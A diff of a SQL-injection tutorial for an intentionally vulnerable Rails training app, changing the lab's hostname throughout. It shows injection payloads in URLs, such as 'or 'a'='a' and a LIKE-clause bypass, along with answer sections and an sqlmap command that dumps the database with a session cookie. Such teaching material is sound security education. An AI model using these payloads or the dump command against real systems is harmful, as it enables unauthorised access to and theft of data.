@@ -25,18 +25,18 @@ When it comes to Rails, [ActiveRecord](http://guides.rubyonrails.org/active_reco
 
 ## Example
 
-https://learn-to-hack.myshopify.io/profiles/1
+https://hack.jackmc.xyz/profiles/1
 
-When visiting the above link, we see the profile with the id value of 1 as expected. However, if we provide an unexpected id value we can see a SQL error: https://learn-to-hack.myshopify.io/profiles/test
+When visiting the above link, we see the profile with the id value of 1 as expected. However, if we provide an unexpected id value we can see a SQL error: https://hack.jackmc.xyz/profiles/test
 
 ```
 ActiveRecord::StatementInvalid in ProfilesController#show
 Mysql2::Error: Unknown column 'test' in 'where clause': SELECT `profiles`.* FROM `profiles` WHERE (id=test) LIMIT 1
 ```
 
-Let's append some SQL to make this return a profile, even when providing it an invalid `id`: https://learn-to-hack.myshopify.io/profiles/1337
+Let's append some SQL to make this return a profile, even when providing it an invalid `id`: https://hack.jackmc.xyz/profiles/1337
 
-Similar to the above admin login example, this will return the first profile: [https://learn-to-hack.myshopify.io/profiles/1337%20or%20'a'='a'](https://learn-to-hack.myshopify.io/profiles/1337%20or%20'a'='a')
+Similar to the above admin login example, this will return the first profile: [https://hack.jackmc.xyz/profiles/1337%20or%20'a'='a'](https://hack.jackmc.xyz/profiles/1337%20or%20'a'='a')
 
 ---
 ## Try it out!
@@ -52,7 +52,7 @@ This app is vulnerable to SQL injection on the products page.
 <details>
   <summary><b>Answer</b></summary>
   The vulnerable parameter is <code>search</code>. This is evident when searching for something with a single quote <code>'</code>. Ex:
-  https://learn-to-hack.myshopify.io/products?utf8=✓&search=evil'&commit=
+  https://hack.jackmc.xyz/products?utf8=✓&search=evil'&commit=
 </details>
 
 #### Can you use something similar to the `or 1=1` trick to return other products here?
@@ -64,7 +64,7 @@ Look at the rails log to see the query being executed. The <code>LIKE</code> cla
 <details>
   <summary><b>Answer</b></summary>
 
-[https://learn-to-hack.myshopify.io/products?search=test%27or%271%25%27=%271](https://learn-to-hack.myshopify.io/products?search=test%27or%271%25%27=%271)
+[https://hack.jackmc.xyz/products?search=test%27or%271%25%27=%271](https://hack.jackmc.xyz/products?search=test%27or%271%25%27=%271)
 
 This works because the final query will be:
 
@@ -88,7 +88,7 @@ Note that access isn't the only concern here, since we can actually do whatever 
 <a href="https://sqlmap.org/">SQLmap</a> is a common tool for exploiting these types of flaws. Using SQLmap the database can be dumped quite easily, with a command such as:
 
 ```
-python sqlmap.py -u https://learn-to-hack.myshopify.io/products?search=pikachu \
+python sqlmap.py -u https://hack.jackmc.xyz/products?search=pikachu \
 --cookie="_learn_to_hack_session=<cookie value>" --dump
 ```
 ...
